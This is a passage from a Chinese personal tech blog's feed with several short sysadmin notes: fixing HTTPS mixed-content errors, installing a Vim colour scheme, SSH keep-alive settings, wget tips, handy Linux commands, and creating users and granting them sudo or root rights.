        <content type="html"><![CDATA[<p>最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的<code>http</code>与<code>https</code>之间的转换。</p><p>网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718144533.png" alt="异常内容"></p><p>这时我才意识到并不是网络延迟的问题，而是项目没有配置好。</p><h2 id="什么是混合内容"><a href="#什么是混合内容" class="headerlink" title="什么是混合内容"></a>什么是混合内容</h2><blockquote><p>当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。<br>如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— <a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">MDN</a></p></blockquote><p>通俗一点解释就是：<code>https</code> 的页面中混合着<code>http</code> 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。</p><h3 id="让Firefox暂时不阻止"><a href="#让Firefox暂时不阻止" class="headerlink" title="让Firefox暂时不阻止"></a>让Firefox暂时不阻止</h3><ol><li>打开新标签页，在地址栏输入 <code>about:config</code>，进入<code>FireFox</code>高级配置页面。</li><li>搜索<code>security.mixed_content.block_active_content</code>，将默认值<code>true</code>更改为<code>false</code>。</li></ol><p>这种方式仅适用于本地调试。</p><h3 id="避免在HTTPS页面中包含HTTP的内容"><a href="#避免在HTTPS页面中包含HTTP的内容" class="headerlink" title="避免在HTTPS页面中包含HTTP的内容"></a>避免在HTTPS页面中包含HTTP的内容</h3><p>更直接有效的方式应该是约定好项目中的协议，统一使用<code>https</code>或者<code>http</code>。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">什么是混合内容——MDN</a></li><li><a href="https://segmentfault.com/a/1190000015722535" target="_blank" rel="noopener">https访问遇到“已阻止载入混合内容”</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim 安装 molokai 配色方案</title>
      <link href="/vim-install-molokai-color-scheme/"/>
      <url>/vim-install-molokai-color-scheme/</url>
      
        <content type="html"><![CDATA[<p>像<a href="https://github.com/altercation/solarized" target="_blank" rel="noopener">solarized</a>、<a href="https://github.com/morhetz/gruvbox" target="_blank" rel="noopener">gruvbox</a>、 <a href="https://github.com/tomasr/molokai" target="_blank" rel="noopener">molokai</a>、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 <code>molokai</code> 。</p><a id="more"></a><p>按照顺序执行完上面的命令，即可使用最经典的配色方案了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .vim &amp;&amp; cd .vim</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.git</span><br><span class="line">cp -rf molokai&#x2F;colors&#x2F; .&#x2F;colors</span><br><span class="line">echo colorscheme molokai &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set background&#x3D;dark  &gt;&gt; ~&#x2F;.vimrc</span><br></pre></td></tr></table></figure><p>实际效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718142924.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshd_config 常用配置项</title>
      <link href="/sshd-config-common-configuration-items/"/>
      <url>/sshd-config-common-configuration-items/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来收录那些常用的<code>sshd_config</code>配置项。</p><a id="more"></a><h3 id="保持链接"><a href="#保持链接" class="headerlink" title="保持链接"></a>保持链接</h3><p>保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。</p><ul><li><code>ServerAliveInterval</code>：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li><li><code>ClientAliveInterval</code>：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li></ul><p>设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host myhostshortcut</span><br><span class="line">     HostName myhost.com</span><br><span class="line">     User barthelemy</span><br><span class="line">     ServerAliveInterval 60</span><br><span class="line">     ServerAliveCountMax 10</span><br></pre></td></tr></table></figure><p>这么设置的作用是：客户端将等待空闲60秒钟（<code>ServerAliveInterval</code>时间），然后向服务器发送 <code>no-op null</code>数据包，并期待响应。</p><p>如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://unix.stackexchange.com/questions/3026/what-options-serveraliveinterval-and-clientaliveinterval-in-sshd-config-exac" target="_blank" rel="noopener">如何让ssh客户端与服务端保持连接</a></li><li><a href="https://linux.die.net/man/5/sshd_config" target="_blank" rel="noopener">sshd_config 参考手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wget 使用技巧</title>
      <link href="/wget-tips/"/>
      <url>/wget-tips/</url>
      
        <content type="html"><![CDATA[<p><code>wget</code> 是一个命令行的下载工具，对于经常使用<code>Linux</code>的用户来说，真是再熟悉不过了。下面总结了一些实用的<code>wget</code>使用技巧，可能会让你更加高效地使用 <code>wget</code>。</p><a id="more"></a><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>最常见的使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合 <code>/</code> 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。</p><p>如果希望对这个下载的文件进行重命名，我们可以使用参数 <code>-O</code> 来指定一个文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><h3 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h3><p>当需要下载比较大的文件时，使用参数 <code>-b</code> 可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg</span><br></pre></td></tr></table></figure><p>然后可以使用以下命令查看当前的进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h3 id="下载目录"><a href="#下载目录" class="headerlink" title="下载目录"></a>下载目录</h3><p>这条命令可以下载 <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a> 网站上 packages 目录中的所有文件。</p><p>参数说明：</p><ul><li><code>-r</code>：下载目录</li><li><code>-np</code>：不遍历父目录</li><li><code>-nd</code>：不在本机重新创建目录结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F;</span><br></pre></td></tr></table></figure><p>与上一条命令相似，但多加了一个 <code>--accept=iso</code> 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F;</span><br></pre></td></tr></table></figure><h3 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h3><p>此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -i filename.txt</span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 <code>-c</code> 参数，作为断点续传。</p><p>好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linuxtoy.org/archives/wget-tips.html" target="_blank" rel="noopener">wget 使用技巧</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些实用的 Linux 命令</title>
      <link href="/some-practical-linux-commands/"/>
      <url>/some-practical-linux-commands/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。</p><a id="more"></a><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo !!"></a>sudo !!</h3><p>有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。</p><p>还真有，<code>!!</code>命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo !!</span><br></pre></td></tr></table></figure><p>注意中间有一个空格。</p><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p><code>nl</code> 命令类似<code>cat</code>命令，都是查看文件内容，但不同之处在于：<code>nl</code>命令会在文本内容的每一行前面，添加行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.txt</span><br><span class="line">boo</span><br><span class="line">mac</span><br><span class="line">$ nl test.txt</span><br><span class="line">1. boo</span><br><span class="line">2. mac</span><br></pre></td></tr></table></figure><h3 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h3><p>以树状的形式返回当前目录的文件夹结构，这个命令很好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree </span><br><span class="line">.</span><br><span class="line">└── test.txt</span><br><span class="line"></span><br><span class="line">0 directories, 1 file</span><br></pre></td></tr></table></figure><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p>和<code>tree</code>类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pstree | grep php</span><br><span class="line">|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off;</span><br><span class="line"> | \--- 01410 boo nginx: worker process</span><br><span class="line"> | |     \--- 73098 boo grep --color&#x3D;auto nginx</span><br></pre></td></tr></table></figure><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>这个命令特别实用，可以用来查看域名解析情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dig 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;0x2BeAce.com.INA</span><br><span class="line">0x2BeAce.com.3581INA185.199.108.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.110.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.111.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.109.153</span><br><span class="line">0x2BeAce.com.3581INNSns12.domaincontrol.com.</span><br><span class="line">0x2BeAce.com.3581INNSns11.domaincontrol.com.</span><br><span class="line">ns12.domaincontrol.com.59833INA173.201.73.6</span><br><span class="line">ns11.domaincontrol.com.92984INA97.74.105.6</span><br><span class="line">ns12.domaincontrol.com.146699INAAAA2603:5:2290::6</span><br><span class="line">ns11.domaincontrol.com.92042INAAAA2603:5:2190::6</span><br></pre></td></tr></table></figure><h3 id="lt-空格-gt-命令"><a href="#lt-空格-gt-命令" class="headerlink" title="&lt;空格&gt; 命令"></a>&lt;空格&gt; 命令</h3><p>这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到<code>history</code>中，那么有没有一个命令可以骗过<code>history</code>，而不被记入呢？答案是有的。</p><p>在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hisotry</span><br><span class="line">8874  pstree | grep nginx</span><br><span class="line">$  date</span><br><span class="line">2020年 5月18日 星期一 21时09分03秒 CST</span><br><span class="line">$ history</span><br><span class="line">8874  pstree | grep nginx</span><br></pre></td></tr></table></figure><h3 id="一些其他命令"><a href="#一些其他命令" class="headerlink" title="一些其他命令"></a>一些其他命令</h3><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><p>查找发行版信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><p>查看当前日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br></pre></td></tr></table></figure><p>立即关机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ shutdown -h now</span><br></pre></td></tr></table></figure><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><p>输出文件类型信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file test.txt</span><br><span class="line">test.txt: ASCII text</span><br></pre></td></tr></table></figure><p>在终端中进行简单的算数运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ expr 1 + 3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>重命名文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mv fileA.txt fileB.txt</span><br><span class="line">$ ls</span><br><span class="line">fileB.txt</span><br></pre></td></tr></table></figure><p>nohup 是一个 <code>POSIX</code> 命令，用于忽略 <code>SIGHUP</code> 。 SIGHUP信号是終端注销时所发送至程序的一个信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohub php script.php</span><br></pre></td></tr></table></figure><p>type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type -a php</span><br><span class="line">php is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</span><br><span class="line">php is &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>命令类型：</p><ul><li>alias：别名。</li><li>keyword：关键字，Shell保留字。</li><li>function：函数，Shell函数。</li><li>builtin：内建命令，Shell内建命令。</li><li>file：文件，磁盘文件，外部命令。</li><li>unfound：没有找到。</li></ul><p>查找进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep php</span><br></pre></td></tr></table></figure><p>注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用<code>-aux</code>参数，但可能其他系统不能加破折号。<br>参考链接：<a href="https://www.computerhope.com/unix/ups.htm" target="_blank" rel="noopener">Linux ps command help and example</a></p><p>杀死进程</p><ol><li>根据 <code>pid</code>（会杀死指定pid 的进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 [pid]</span><br></pre></td></tr></table></figure><ol start="2"><li>根据进程名称（会杀死一组同名进程）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall php</span><br></pre></td></tr></table></figure><h3 id="全局根据文件名查找文件具体路径"><a href="#全局根据文件名查找文件具体路径" class="headerlink" title="全局根据文件名查找文件具体路径"></a>全局根据文件名查找文件具体路径</h3><p>有时候很想找到某个文件，但是又不记得具体路径了，这时可以使用 <code>find</code> 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &lt;file name&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/zhu_xun/article/details/17018799" target="_blank" rel="noopener">鲜为人知而又实用的 Linux 命令</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 命令整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 添加用户以及权限分配</title>
      <link href="/linux-add-users-and-assign-permissions/"/>
      <url>/linux-add-users-and-assign-permissions/</url>
      
        <content type="html"><![CDATA[<p>写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。</p><p>另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>在 Linux 上，添加用户有两种方式：<code>useradd</code>和<code>adduser</code>，其区别就是：</p><ul><li>useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。</li><li>adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。</li></ul><h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><p>相比 useradd，adduser的使用要简单很多。</p><p>使用adduser 添加一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser boo</span><br></pre></td></tr></table></figure><p>然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 <code>/home</code> 目录下创建一个与用户同名的目录。</p><p>用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。</p><h3 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h3><p>useradd 命令有大量的参数供我们进行个性设置，常用参数如下：</p><ul><li>-d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权</li><li>-g&lt;群组&gt;：指定用户所属的群组；</li><li>-G&lt;群组&gt;：指定用户所属的附加群组；</li><li>-m：在 /home 目录下自动建立用户的登入目录；</li><li>-r：建立系统帐号；</li><li>-s<shell>：指定用户登入后所使用的shell；</li><li>-u<uid>：指定用户的 id</li></ul><p>使用 useradd 创建用户的一般步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ useradd -m boo -s &#x2F;bin&#x2F;bash</span><br><span class="line">$ passwd boo</span><br><span class="line">$ ls &#x2F;home&#x2F;</span><br><span class="line">boo</span><br></pre></td></tr></table></figure><p>其中要注意的有：</p><ol><li>useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。</li><li>useradd <del>这个命令创建的是普通账号，并不能用来登录系统</del>。加上参数<code>-r</code>，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。</li><li>当使用参数<code>-m</code>的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用<code>-m</code>的话，那么就默认是使用<code>-M</code>参数，不创建主文件夹，即使你使用了<code>-d</code>这个参数。所以如果想要自己选择主文件夹，需要同时加上<code>-m</code>和<code>-d</code>参数。</li><li>误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。</li></ol><h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>不出意外，你肯定会得到这样一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[sudo] password for boo:</span><br><span class="line">boo is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？</p><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL&#x3D;(ALL) ALL</span><br><span class="line"></span><br><span class="line"># 找到该注释，在其下增加一行 </span><br><span class="line">%yourusername ALL&#x3D;(ALL) ALL</span><br></pre></td></tr></table></figure><p>然后保存退出，就会发现可以使用 sudo 提权了。</p><h3 id="赋予-root-权限"><a href="#赋予-root-权限" class="headerlink" title="赋予 root 权限"></a>赋予 root 权限</h3><p>这里有三种方式，先来看看最简单的方式：</p><p>方式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 将用户id 改为 0</span><br><span class="line">testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>该方法适用于普通用户以及管理员用户</li><li>使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。</li></ol><p>方式二：（这里以ubuntu 系统为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">#  Allow members of group sudo to execute any command</span><br><span class="line">%sudo   ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># 在其后面增加一行</span><br><span class="line">%wheel ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>然后修改该用户，使其属于 root 组（wheel）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -g root boo</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式三：（这里以ubuntu 为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。</p><p>另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 <del>远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。</del></p><p>事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 <code>Permission denied, please try again.</code>这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。</p><h3 id="扩展补充"><a href="#扩展补充" class="headerlink" title="扩展补充"></a>扩展补充</h3><h4 id="在Ubuntu中如何修改-root-密码"><a href="#在Ubuntu中如何修改-root-密码" class="headerlink" title="在Ubuntu中如何修改 root 密码"></a>在Ubuntu中如何修改 root 密码</h4><p>默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如<code>su -</code>之类的命令成为超级用户。</p><p>但可以借助其他方式，使用<code>passwd</code>命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。</p><p>使用以下命令成为 root用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i</span><br><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><p>如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><h4 id="在Ubuntu中如何远程-root-登入"><a href="#在Ubuntu中如何远程-root-登入" class="headerlink" title="在Ubuntu中如何远程 root 